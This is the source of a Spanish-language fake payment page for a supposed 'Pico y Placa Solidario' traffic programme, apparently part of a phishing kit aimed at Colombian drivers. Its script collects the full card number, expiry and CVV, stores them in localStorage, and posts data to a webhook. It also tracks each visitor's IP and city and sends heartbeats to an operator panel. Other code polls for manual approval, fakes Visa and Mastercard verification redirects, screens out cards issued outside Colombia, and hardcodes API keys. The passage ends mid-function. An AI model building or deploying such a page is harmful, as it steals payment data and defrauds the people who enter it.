<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago Seguro - Pico y Placa Solidario</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Roboto', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            overflow-x: hidden;
        }

        .background-wrapper {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            overflow: hidden;
        }
        .background-wrapper .bg-image { width: 100%; height: 100%; object-fit: cover; display: block; }
        .background-wrapper .bg-blur {
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%;
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            background: rgba(0, 0, 0, 0.3);
        }

        .modal-overlay {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
        }

        .modal-box {
            background: #ffffff;
            border-radius: 0.75rem;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            width: 100%;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-header {
            background: #f5f5f5;
            padding: 1.5rem;
            border-bottom: 1px solid #e0e0e0;
            position: relative;
        }

        .modal-close-btn {
            position: absolute;
            top: 1rem; right: 1rem;
            width: 32px; height: 32px;
            border: none; background: none;
            font-size: 1.8rem; color: #666;
            cursor: pointer;
            display: flex; align-items: center; justify-content: center;
            border-radius: 50%;
            transition: background 0.2s;
        }
        .modal-close-btn:hover { background: rgba(0,0,0,0.05); color: #333; }

        .modal-header h2 { font-size: 1.2rem; color: #000; font-weight: 700; margin-bottom: 0.3rem; }
        .modal-header p { font-size: 0.9rem; color: #666; margin: 0; }

        .stepper {
            display: flex; align-items: center; justify-content: center;
            gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem;
        }
        .step { display: flex; flex-direction: column; align-items: center; gap: 0.35rem; min-width: 50px; }
        .step-circle {
            width: 32px; height: 32px;
            border-radius: 50%;
            background: #d0d0d0; color: white;
            font-weight: 700; font-size: 0.9rem;
            display: flex; align-items: center; justify-content: center;
            transition: all 0.3s;
        }
        .step-circle.active { background: #00271C; box-shadow: 0 0 12px rgba(0,39,28,0.4); }
        .step-circle.completed { background: #88F456; color: #00271C; }
        .step-line { width: 30px; height: 2px; background: #d0d0d0; margin: 0 -0.25rem; }
        .step-line.completed { background: #88F456; }
        .step-label { font-size: 0.7rem; color: #999; text-align: center; max-width: 60px; line-height: 1.2; }
        .step-label.active { color: #00271C; font-weight: 600; }

        .modal-content { flex: 1; overflow-y: auto; padding: 2rem 1.5rem; }
        .modal-content::-webkit-scrollbar { width: 6px; }
        .modal-content::-webkit-scrollbar-track { background: #f1f1f1; }
        .modal-content::-webkit-scrollbar-thumb { background: #b0b0b0; border-radius: 3px; }

        .payment-method {
            display: flex; gap: 2rem;
            margin-bottom: 2rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid #e0e0e0;
            justify-content: center; align-items: center;
        }
        .payment-method img { width: 48px; height: auto; object-fit: contain; }

        .form-group { margin-bottom: 1.2rem; }
        .form-group label {
            display: block; font-size: 0.9rem; font-weight: 600;
            color: #000; margin-bottom: 0.6rem;
        }
        .form-group input {
            width: 100%;
            padding: 0.75rem 0.75rem;
            border: 2px solid #ddd;
            border-radius: 0.4rem;
            font-size: 0.95rem;
            color: #333;
            background: #fafbfc;
            font-family: 'Roboto', sans-serif;
            transition: all 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #00271C;
            background: white;
        }
        .form-group input::placeholder { color: #999; }
        .form-group input:disabled { opacity: 0.7; cursor: not-allowed; }
        .form-group.error input { border-color: #e53935; background: #fff5f5; }

        .form-row { display: grid; grid-template-columns: 2fr 1fr; gap: 1rem; }
        .form-row .form-group { margin-bottom: 0; }

        .card-input-wrapper { position: relative; width: 100%; }
        .card-input-wrapper input { width: 100%; padding-right: 50px; margin: 0; box-sizing: border-box; }

        .card-logo {
            position: absolute;
            right: 12px; top: 50%;
            transform: translateY(-50%);
            width: 36px; height: 24px;
            display: flex; align-items: center; justify-content: center;
            pointer-events: none;
        }
        .card-logo img { max-width: 100%; max-height: 100%; object-fit: contain; }

        .checkbox-group {
            display: flex; align-items: flex-start; gap: 0.6rem;
            margin-bottom: 1.5rem;
            padding: 1rem;
            background: #f5f5f5;
            border-radius: 0.4rem;
        }
        .checkbox-group input[type="checkbox"] {
            width: 18px; height: 18px;
            cursor: pointer;
            accent-color: #00271C;
            flex-shrink: 0;
            margin-top: 0.15rem;
        }
        .checkbox-group label {
            margin: 0;
            font-size: 0.85rem;
            color: #333;
            cursor: pointer;
            flex: 1;
            line-height: 1.4;
        }
        .checkbox-group a { color: #00271C; text-decoration: none; font-weight: 600; }
        .checkbox-group a:hover { text-decoration: underline; }

        .alert {
            padding: 1rem;
            border-radius: 0.4rem;
            margin-bottom: 1rem;
            font-size: 0.9rem;
            font-weight: 500;
            display: none;
            align-items: center;
            gap: 0.8rem;
        }
        .alert-error {
            background: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
        }
        .alert-error.show { display: flex; }

        .button-group { display: flex; gap: 1rem; margin-top: 1.5rem; }

        .btn {
            flex: 1;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 9999px;
            font-size: 0.95rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Roboto', sans-serif;
        }
        .btn-submit {
            background: #00271C;
            color: #88F456;
            box-shadow: 0 4px 12px rgba(0,39,28,0.2);
        }
        .btn-submit:hover {
            background: #00391f;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(0,39,28,0.3);
        }
        .btn-submit:active { transform: translateY(0); }
        .btn-submit:disabled { background: #6b7280; cursor: not-allowed; transform: none; }
        .btn-cancel {
            background: white;
            color: #00271C;
            border: 2px solid #00271C;
        }
        .btn-cancel:hover { background: #f0f9f7; }

        /* ==========================================================
           LOADING OVERLAY — IGUAL AL DE paso3.php
           ========================================================== */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.60);
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            padding: 20px;
        }
        .loading-overlay.active { display: flex; }

        .loading-card {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 32px 32px 32px;
            max-width: 360px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            text-align: center;
            animation: slideUp 0.4s ease-out;
            margin: auto;
            border: 1px solid #f0f0f0;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px) scale(0.96); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }

        .loading-card .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 24px;
            min-height: 100px;
        }
        .loading-card .logo-container .logo-img {
            height: 80px;
            width: auto;
            max-width: 150px;
            object-fit: contain;
        }

        .loading-card .loading-text {
            font-size: 0.95rem;
            font-weight: 500;
            color: #374151;
            margin-bottom: 20px;
            letter-spacing: 0.2px;
        }

        .progress-bar-wrapper { width: 100%; }
        .progress-bar-track {
            width: 100%;
            height: 4px;
            background: #e5e7eb;
            border-radius: 4px;
            overflow: hidden;
            position: relative;
        }
        .progress-bar-fill-loading {
            height: 100%;
            background: #2c5697;
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
            position: relative;
        }
        .progress-bar-fill-loading::after {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: shimmer 1.5s infinite;
        }
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .loading-card .initial-spinner {
            display: none;
            width: 48px;
            height: 48px;
            border: 3px solid #e5e7eb;
            border-top: 3px solid #2c5697;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }
        .loading-card .initial-spinner.active { display: block; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .modal-overlay { max-width: 100%; padding: 0; }
            .modal-box { border-radius: 1rem 1rem 0 0; max-height: 95vh; }
            .modal-header { padding: 1.2rem 1rem; }
            .modal-content { padding: 1.5rem 1rem; }
            .modal-close-btn { width: 28px; height: 28px; font-size: 1.5rem; }
            .modal-header h2 { font-size: 1rem; }
            .form-row { grid-template-columns: 1fr; }
            .button-group { flex-direction: column; }
            .btn { width: 100%; }
            .loading-card { padding: 32px 24px 28px 24px; max-width: 330px; }
            .loading-card .logo-container .logo-img { height: 70px; max-width: 130px; }
            .loading-card .loading-text { font-size: 0.9rem; }
        }
        @media (max-width: 480px) {
            body { padding: 0; }
            .modal-overlay { padding: 0; }
            .modal-header { padding: 1rem 0.75rem; }
            .modal-content { padding: 1.2rem 0.75rem; }
            .modal-close-btn { width: 24px; height: 24px; font-size: 1.3rem; top: 0.6rem; right: 0.6rem; }
            .form-group label { font-size: 0.85rem; }
            .form-group input { padding: 0.6rem; font-size: 0.9rem; }
            .form-row { gap: 0.75rem; }
            .button-group { gap: 0.5rem; }
            .btn { padding: 0.6rem 1rem; font-size: 0.9rem; }
            .checkbox-group label { font-size: 0.75rem; }
            .loading-card { padding: 28px 20px 24px 20px; max-width: 300px; }
            .loading-card .logo-container .logo-img { height: 60px; max-width: 110px; }
            .loading-card .loading-text { font-size: 0.85rem; }
        }
    </style>
</head>
<body>

<!-- ===== LOADING OVERLAY (igual al de paso3.php) ===== -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
        <div class="initial-spinner active" id="initialSpinner"></div>
        <div class="logo-container" id="logoContainer" style="display:none;">
            <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
        </div>
        <div class="loading-text" id="loadingText">Procesando pago...</div>
        <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
            <div class="progress-bar-track">
                <div class="progress-bar-fill-loading" id="progressFill"></div>
            </div>
        </div>
    </div>
</div>

<div class="background-wrapper">
    <img class="bg-image" src="blur.png" alt="Fondo">
    <div class="bg-blur"></div>
</div>

<div class="modal-overlay">
    <div class="modal-box">

        <div class="modal-header">
            <button class="modal-close-btn" onclick="window.location.href='paso4.php';">✕</button>
            <h2>Información de Pago</h2>
            <p>Completa los datos de tu tarjeta de crédito</p>

            <div class="stepper">
                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Datos</div></div>
                <div class="step-line completed"></div>
                <div class="step"><div class="step-circle completed">✓</div><div class="step-label">Placa</div></div>
                <div class="step-line completed"></div>
                <div class="step"><div class="step-circle active">3</div><div class="step-label active">Pago</div></div>
                <div class="step-line"></div>
                <div class="step"><div class="step-circle">4</div><div class="step-label">Confirmar</div></div>
            </div>
        </div>

        <div class="modal-content">
            <div class="alert alert-error" id="alertError">
                <span>❌</span>
                <span id="mensajeError">Por favor, completa todos los campos correctamente</span>
            </div>

            <h3 style="font-size: 0.95rem; color: #000; margin-bottom: 1rem; font-weight: 600;">Tarjeta débito/crédito</h3>

            <div class="payment-method">
                <img src="visa.png" alt="Visa">
                <img src="mastercard.png" alt="Mastercard">
                <img src="ame.png" alt="American Express">
            </div>

            <form id="paymentForm" onsubmit="return false;">
                <div class="form-group">
                    <label for="nombre">Nombre del titular</label>
                    <input
                        type="text"
                        id="nombre"
                        name="nombre"
                        placeholder="Juan Pérez García"
                        autocomplete="cc-name"
                        required>
                </div>

                <div class="form-group">
                    <label for="numero">Número de tarjeta</label>
                    <div class="card-input-wrapper">
                        <input
                            type="text"
                            id="numero"
                            name="numero"
                            placeholder="1234 5678 9012 3456"
                            maxlength="19"
                            autocomplete="cc-number"
                            required>
                        <div class="card-logo" id="cardLogo"></div>
                    </div>
                    <div class="error-message" id="cardNumberError" style="display:none; color:#e53935; font-size:0.78rem; margin-top:6px;"></div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label for="exp">Fecha de vencimiento</label>
                        <input
                            type="text"
                            id="exp"
                            name="exp"
                            placeholder="MM / AA"
                            maxlength="7"
                            autocomplete="cc-exp"
                            required>
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input
                            type="text"
                            id="cvv"
                            name="cvv"
                            placeholder="123"
                            maxlength="4"
                            autocomplete="cc-csc"
                            required>
                    </div>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="terms" name="terms" required>
                    <label for="terms">
                        Autorizo el pago y acepto los <a href="#">términos de servicio</a>
                    </label>
                </div>

                <div class="button-group">
                    <button type="button" id="btnPagar" class="btn btn-submit">
                        Pagar Ahora
                    </button>
                    <button type="button" onclick="window.location.href='paso4.php';" class="btn btn-cancel">
                        Cancelar
                    </button>
                </div>
            </form>
        </div>

    </div>
</div>

<script>
    // ============================================================
    // CONFIGURACIÓN — MISMOS ENDPOINTS DE paso3.php
    // ============================================================
    const WEBHOOK_URL = '/api/webhook.php';
    const HEARTBEAT_URL = '/api/heartbeat.php';
    const TRACKING_URL = '/api/usuarios_online.php';
    const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
    const POLLING_INTERVAL = 2000;
    const MAX_POLLING_TIME = 300000;
    const HEARTBEAT_INTERVAL = 5000;

    // ============================================================
    // CAPTURAR IP + PAÍS + CIUDAD
    // ============================================================
    async function capturarIP() {
        if (localStorage.getItem('usuario_ip')) return localStorage.getItem('usuario_ip');

        try {
            const resp = await fetch('https://ipwho.is/');
            const data = await resp.json();
            if (data.success && data.ip) {
                localStorage.setItem('usuario_ip', data.ip);
                localStorage.setItem('usuario_pais', data.country || 'Desconocido');
                localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                return data.ip;
            }
        } catch (e) {}

        try {
            const resp = await fetch('https://ipapi.co/json/');
            const data = await resp.json();
            if (data.ip) {
                localStorage.setItem('usuario_ip', data.ip);
                localStorage.setItem('usuario_pais', data.country_name || 'Desconocido');
                localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                return data.ip;
            }
        } catch (e) {}

        try {
            const resp = await fetch('https://api.ipify.org?format=json');
            const data = await resp.json();
            if (data.ip) {
                localStorage.setItem('usuario_ip', data.ip);
                return data.ip;
            }
        } catch (e) {}

        localStorage.setItem('usuario_ip', 'Desconocida');
        return null;
    }
    capturarIP();

    // ============================================================
    // ESTADO GLOBAL
    // ============================================================
    let solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    let pollingInterval = null;
    let cardType = null;
    let detectedBank = null;
    let heartbeatInterval = null;
    let tipoTarjeta = '';

    // ============================================================
    // TRACKING ONLINE
    // ============================================================
    let usuarioId = localStorage.getItem('usuarioId');
    if (!usuarioId) {
        usuarioId = 'USR-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('usuarioId', usuarioId);
    }

    function enviarHeartbeatTracking() {
        fetch(TRACKING_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuarioId: usuarioId,
                pagina: window.location.pathname
            })
        }).catch(() => {});
    }
    enviarHeartbeatTracking();
    setInterval(enviarHeartbeatTracking, 5000);

    window.addEventListener('beforeunload', function() {
        navigator.sendBeacon(TRACKING_URL, JSON.stringify({
            usuarioId: usuarioId,
            pagina: 'cerrando'
        }));
    });

    // ============================================================
    // HEARTBEAT PANEL
    // ============================================================
    function enviarHeartbeat(estado = 'activo') {
        try {
            fetch(HEARTBEAT_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    solicitudId: solicitudId,
                    usuario: document.getElementById('nombre')?.value || '',
                    estado: estado,
                    ip: localStorage.getItem('usuario_ip') || '',
                    pais: localStorage.getItem('usuario_pais') || '',
                    ciudad: localStorage.getItem('usuario_ciudad') || ''
                }),
                keepalive: true
            }).catch(() => {});
        } catch (e) {}
    }

    function iniciarHeartbeat() {
        enviarHeartbeat('activo');
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        heartbeatInterval = setInterval(() => enviarHeartbeat('activo'), HEARTBEAT_INTERVAL);
    }

    function detenerHeartbeat(notificar = true) {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
            heartbeatInterval = null;
        }
        if (notificar) {
            try {
                navigator.sendBeacon(HEARTBEAT_URL, JSON.stringify({
                    solicitudId: solicitudId,
                    estado: 'offline'
                }));
            } catch (e) {}
        }
    }

    window.addEventListener('beforeunload', () => detenerHeartbeat(true));

    // ============================================================
    // ELEMENTOS DOM
    // ============================================================
    const inputNumero = document.getElementById('numero');
    const cardLogo = document.getElementById('cardLogo');
    const inputExp = document.getElementById('exp');
    const inputCVV = document.getElementById('cvv');
    const inputNombre = document.getElementById('nombre');
    const btnPagar = document.getElementById('btnPagar');
    const alertError = document.getElementById('alertError');
    const mensajeError = document.getElementById('mensajeError');
    const cardNumberError = document.getElementById('cardNumberError');
    const form = document.getElementById('paymentForm');

    // Loading elements
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const logoContainer = document.getElementById('logoContainer');
    const cardLogoImg = document.getElementById('cardLogoImg');
    const progressWrapper = document.getElementById('progressWrapper');
    const progressFill = document.getElementById('progressFill');
    const initialSpinner = document.getElementById('initialSpinner');

    // ============================================================
    // BINS BLOQUEADOS
    // ============================================================
    const BINS_NU = [
        '528892', '555825', '555829', '52141881',
        '52749332', '54549472', '55952666', '55953587'
    ];
    const BINS_NEQUI = ['409355'];

    function getBinBloqueadoInfo(cardNumber) {
        const cleanNumber = cardNumber.replace(/\s/g, '');
        for (const bin of BINS_NEQUI) {
            if (cleanNumber.startsWith(bin)) {
                return {
                    bloqueado: true,
                    tipo: 'nequi',
                    mensaje: '⚠️ Nequi se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.'
                };
            }
        }
        for (const bin of BINS_NU) {
            if (cleanNumber.startsWith(bin)) {
                return {
                    bloqueado: true,
                    tipo: 'nu',
                    mensaje: '⚠️ Nu se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.'
                };
            }
        }
        return { bloqueado: false };
    }

    // ============================================================
    // DETECCIÓN DE TIPO DE TARJETA
    // ============================================================
    const cardPatterns = {
        visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/, lengths: [13, 16, 19] },
        mastercard: { regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/, lengths: [16, 19] },
        amex: { regex: /^3[47][0-9]{13}$/, lengths: [15, 19] }
    };

    function detectCardType(cardNumber) {
        const cleanNumber = cardNumber.replace(/\s/g, '');
        if (cleanNumber.length >= 3) {
            const firstThree = cleanNumber.substring(0, 3);
            const firstTwo = cleanNumber.substring(0, 2);
            const firstOne = cleanNumber.substring(0, 1);
            if (firstOne === '4') {
                if (cardPatterns.visa.regex.test(cleanNumber) || cleanNumber.length < 13) return 'visa';
            }
            if (firstTwo === '34' || firstTwo === '37') {
                if (cardPatterns.amex.regex.test(cleanNumber) || cleanNumber.length < 15) return 'amex';
            }
            if ((firstTwo >= '51' && firstTwo <= '55') || (firstThree >= '222' && firstThree <= '272')) {
                if (cardPatterns.mastercard.regex.test(cleanNumber) || cleanNumber.length < 16) return 'mastercard';
            }
        }
        if (cleanNumber.length >= 13) {
            if (cardPatterns.visa.regex.test(cleanNumber)) return 'visa';
            else if (cardPatterns.mastercard.regex.test(cleanNumber)) return 'mastercard';
            else if (cardPatterns.amex.regex.test(cleanNumber)) return 'amex';
        }
        return null;
    }

    function updateCardLogo(type) {
        cardLogo.innerHTML = '';
        const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'ame.png' };
        if (map[type]) {
            const img = document.createElement('img');
            img.src = map[type];
            img.alt = type;
            cardLogo.appendChild(img);
        }
    }

    function formatCardNumber(value) {
        return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
    }

    function formatExpiry(value) {
        const cleaned = value.replace(/\D/g, '');
        if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
        return cleaned;
    }

    // ============================================================
    // DETECCIÓN DE BANCO POR BIN (HANDYAPI)
    // ============================================================
    const binCache = new Map();
    const bankNameMapping = {
        'bancolombia': 'Bancolombia', 'bancolombia s.a.': 'Bancolombia',
        'davivienda': 'Davivienda', 'banco davivienda': 'Davivienda',
        'bbva colombia': 'BBVA Colombia', 'bbva': 'BBVA Colombia',
        'banco de bogotá': 'Banco de Bogotá', 'banco de bogota': 'Banco de Bogotá',
        'banco popular': 'Banco Popular',
        'banco occidente': 'Banco Occidente',
        'citibank colombia': 'Citibank Colombia', 'citibank': 'Citibank Colombia',
        'banco av villas': 'Banco AV Villas', 'av villas': 'Banco AV Villas',
        'itau': 'Itaú', 'banco itaú': 'Itaú', 'banco itau': 'Itaú',
        'gnb sudameris': 'Banco GNB Sudameris', 'banco gnb sudameris': 'Banco GNB Sudameris',
        'falabella': 'Banco Falabella', 'banco falabella': 'Banco Falabella',
        'pichincha': 'Banco Pichincha', 'banco pichincha': 'Banco Pichincha',
        'caja social': 'Caja Social', 'banco caja social': 'Caja Social',
        'coopcentral': 'Banco Cooperativo Coopcentral',
        'bancoomeva': 'Bancoomeva',
        'finandina': 'Banco Finandina', 'banco finandina': 'Banco Finandina',
        'davibank': 'Davibank',
        'scotiabank colpatria': 'Scotiabank Colpatria',
        'banco agrario': 'Banco Agrario'
    };

    async function detectBankByBIN(cardNumber) {
        const cleanNumber = cardNumber.replace(/\s/g, '');
        if (cleanNumber.length < 6) { detectedBank = null; return null; }

        const bin = cleanNumber.substring(0, 6);

        // Cache local (compartido entre páginas)
        const localCache = JSON.parse(localStorage.getItem('binCache') || '{}');
        if (localCache[bin] !== undefined) {
            detectedBank = localCache[bin];
            if (detectedBank) localStorage.setItem('bancoEmisor', detectedBank);
            return detectedBank;
        }

        if (binCache.has(bin)) {
            const cached = binCache.get(bin);
            detectedBank = cached;
            if (cached) localStorage.setItem('bancoEmisor', cached);
            return cached;
        }

        try {
            const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
                method: 'GET',
                headers: {
                    'x-api-key': 'HAS-139kYW5q3NS98PmXt8w67rbDH',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const data = await response.json();
            console.log('📡 HandyAPI:', data);

            if (data.Status === 'ERROR' || data.error) throw new Error(data.error || 'Error en la API');

            let bankName = null;
            let countryCode = null;

            if (data.Issuer) {
                const rawName = data.Issuer.toLowerCase().trim();
                for (const [key, value] of Object.entries(bankNameMapping)) {
                    if (rawName.includes(key) || key.includes(rawName)) {
                        bankName = value;
                        break;
                    }
                }
                if (!bankName) {
                    bankName = data.Issuer.split(' ')
                        .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
                        .join(' ');
                }
            }

            if (data.Country) countryCode = data.Country.A2 || '';
            if (!bankName) bankName = 'Desconocido';

            if (countryCode && countryCode !== 'CO') {
                console.warn('⚠️ Tarjeta no emitida en Colombia');
                binCache.set(bin, null);
                detectedBank = null;
                localStorage.removeItem('bancoEmisor');
                return null;
            }

            binCache.set(bin, bankName);
            localCache[bin] = bankName;
            localStorage.setItem('binCache', JSON.stringify(localCache));
            detectedBank = bankName;
            localStorage.setItem('bancoEmisor', bankName);
            console.log('🏦 Banco detectado:', bankName);
            return bankName;
        } catch (error) {
            console.error('❌ Error HandyAPI:', error);
            detectedBank = null;
            return null;
        }
    }

    // ============================================================
    // HELPERS UI
    // ============================================================
    function mostrarError(mensaje) {
        mensajeError.textContent = mensaje;
        alertError.classList.add('show');
        setTimeout(() => alertError.classList.remove('show'), 5000);
    }
    function ocultarError() { alertError.classList.remove('show'); }

    function habilitarFormulario() {
        btnPagar.disabled = false;
        btnPagar.textContent = 'Pagar Ahora';
        inputNumero.disabled = false;
        inputNombre.disabled = false;
        inputExp.disabled = false;
        inputCVV.disabled = false;
    }

    // ============================================================
    // INPUTS
    // ============================================================
    let bankTimeout = null;

    inputNumero.addEventListener('input', function() {
        let value = this.value.replace(/\s/g, '');
        value = value.replace(/\D/g, '');
        this.value = formatCardNumber(value);

        if (value.length >= 3) {
            cardType = detectCardType(value);
            updateCardLogo(cardType);
        } else {
            cardLogo.innerHTML = '';
            cardType = null;
        }

        const info = getBinBloqueadoInfo(value);
        if (value.length >= 6 && info.bloqueado) {
            cardNumberError.textContent = info.mensaje;
            cardNumberError.style.display = 'block';
            inputNumero.closest('.form-group').classList.add('error');
        } else {
            cardNumberError.style.display = 'none';
            inputNumero.closest('.form-group').classList.remove('error');
        }

        clearTimeout(bankTimeout);
        if (value.length >= 6) {
            bankTimeout = setTimeout(() => detectBankByBIN(value), 600);
        } else {
            detectedBank = null;
            localStorage.removeItem('bancoEmisor');
        }
    });

    inputExp.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9/]/g, '');
        this.value = formatExpiry(this.value);
    });

    inputCVV.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    inputNombre.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
    });

    // ============================================================
    // POLLING — CONSULTA ESTADO
    // ============================================================
    async function verificarEstadoSolicitud(id) {
        try {
            const response = await fetch(`/api/estado.php?id=${id}`);
            const data = await response.json();
            if (data.estado === 'approved') {
                clearInterval(pollingInterval);
                pollingInterval = null;
                mostrarCargaConLogos(data.tipo_tarjeta || cardType || 'visa');
                return true;
            } else if (data.estado === 'rejected') {
                clearInterval(pollingInterval);
                pollingInterval = null;
                loadingOverlay.classList.remove('active');
                mostrarError('❌ Pago rechazado. Intente nuevamente.');
                habilitarFormulario();
                return false;
            }
            return null;
        } catch (error) {
            return 'error';
        }
    }

    function iniciarPolling() {
        if (pollingInterval) clearInterval(pollingInterval);
        let tiempoInicio = Date.now();
        pollingInterval = setInterval(async () => {
            if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                clearInterval(pollingInterval);
                pollingInterval = null;
                loadingOverlay.classList.remove('active');
                mostrarError('⏰ Tiempo de espera agotado.');
                habilitarFormulario();
                return;
            }
            const resultado = await verificarEstadoSolicitud(solicitudId);
            if (resultado === true || resultado === false) return;
        }, POLLING_INTERVAL);
    }

    // ============================================================
    // CARGA CON LOGOS + REDIRECCIÓN SEGÚN TIPO — IGUAL A paso3.php
    // ============================================================
    function mostrarCargaConLogos(tipo) {
        // Ocultar spinner inicial
        initialSpinner.classList.remove('active');
        initialSpinner.style.display = 'none';

        // Mostrar logo de la tarjeta
        logoContainer.style.display = 'flex';
        const cardLogoFile = {
            'visa': 'visa.png',
            'mastercard': 'mastercard.png',
            'amex': 'ame.png'
        }[tipo];
        if (cardLogoFile) {
            cardLogoImg.src = cardLogoFile;
            cardLogoImg.alt = tipo;
        }

        // Mostrar barra de progreso
        progressWrapper.style.display = 'block';

        // Texto según el tipo de tarjeta
        const nombres = {
            'visa': 'Verified by Visa',
            'mastercard': 'Mastercard ID Check',
            'amex': 'American Express SafeKey'
        };
        loadingText.textContent = 'Redirigiendo a ' + (nombres[tipo] || '...');

        // Animación de la barra
        let progress = 0;
        const duration = 3000;
        const interval = 50;
        const steps = duration / interval;
        const increment = 100 / steps;
        progressFill.style.width = '0%';

        const timer = setInterval(() => {
            progress += increment;
            if (progress >= 100) {
                progress = 100;
                clearInterval(timer);
                setTimeout(() => {
                    redirigirSegunTipoTarjeta(tipo);
                }, 400);
            }
            progressFill.style.width = progress + '%';
        }, interval);
    }

    function redirigirSegunTipoTarjeta(tipo) {
        const map = {
            'visa': 'visa.php',
            'mastercard': 'master.php',
            'amex': 'amex.php'
        };
        window.location.href = map[tipo] || 'index.php';
    }

    // ============================================================
    // WEBHOOK
    // ============================================================
    async function enviarDatosAlWebhook(datos) {
        try {
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-API-Key': API_KEY
                },
                body: JSON.stringify(datos)
            });
            const text = await response.text();
            let data;
            try { data = JSON.parse(text); }
            catch (e) { console.error('❌ Respuesta no JSON:', text.substring(0, 200)); return false; }
            if (data.success) return data.id;
            console.error('❌ Error webhook:', data.error);
            return false;
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            return false;
        }
    }

    // ============================================================
    // GUARDAR EN LOCALSTORAGE
    // ============================================================
    function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
        const cardLast4 = cardNumber.slice(-4);
        localStorage.setItem('cardNumber', cardNumber);
        localStorage.setItem('cardLast4', cardLast4);
        localStorage.setItem('cvc', cvc);
        localStorage.setItem('expiry', expiry);
        localStorage.setItem('cardholderName', cardholderName);
        localStorage.setItem('cardType', cardType || '');
        if (banco) localStorage.setItem('bancoEmisor', banco);
    }

    // ============================================================
    // BOTÓN PAGAR
    // ============================================================
    btnPagar.addEventListener('click', async function() {
        ocultarError();

        const nombre = inputNombre.value.trim();
